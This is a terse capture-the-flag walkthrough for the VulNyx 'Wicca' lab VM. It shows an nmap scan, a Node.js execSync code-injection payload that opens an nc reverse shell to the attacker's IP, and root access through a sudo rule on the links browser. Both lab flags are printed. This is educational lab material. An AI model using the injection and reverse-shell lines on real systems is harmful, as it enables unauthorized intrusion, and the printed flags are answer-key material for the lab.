# VulNyx - Wicca

## Information
**Wicca** is a low difficulty vulnerable Linux virutal machine from the VulNyx platform, it works on correctly on VirtualBox and VMware hypervisors.

## Solution
### Enumeration 
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.100.164
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-22 11:54 +07
Nmap scan report for wicca.lan (192.168.100.164)
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 3a:dc:d6:1d:84:b6:96:c0:8f:96:1e:65:a0:24:0e:fb (ECDSA)
|_  256 de:93:17:fb:3a:19:9c:e0:17:32:2d:a9:73:f7:c5:94 (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: VulNyx Lab
MAC Address: 08:00:27:70:DB:B5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.83 seconds
```

### Shell (aleister)
Reverse shell script
```bash
URL: 
res.end(require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.172 443 > /tmp/f').toString())

URL encode: res.end(require(%27child_process%27).execSync(%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.100.172%20443%20%3E%20%2Ftmp%2Ff%27).toString())
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.164] 45122
/bin/sh: 0: can't access tty; job control turned off
$ id ; hostname
uid=1001(aleister) gid=1001(aleister) groups=1001(aleister)
wicca
$ which python3 
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
aleister@wicca:/$ ^Z
zsh: suspended  nc -lvnp 443
```
### Privilege Escalation
#### Enumeration
```bash
aleister@wicca:~$ sudo -l
Matching Defaults entries for aleister on wicca:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User aleister may run the following commands on wicca:
    (root) NOPASSWD: /usr/bin/links
```
#### Abuse
```bash
aleister@wicca:~$ sudo links
root@wicca:/home/aleister# id ; hostname
uid=0(root) gid=0(root) groups=0(root)
wicca
```

#### Flags
```bash
root@wicca:/home/aleister# find / -name root.txt -o -name user.txt | xargs cat
VulNyx{d9f213df08ea2b3bf6cc90be28fa827f}
VulNyx{dab686b0ee76b5edf6fc317c51d6f102}
```

***You are welcome!***
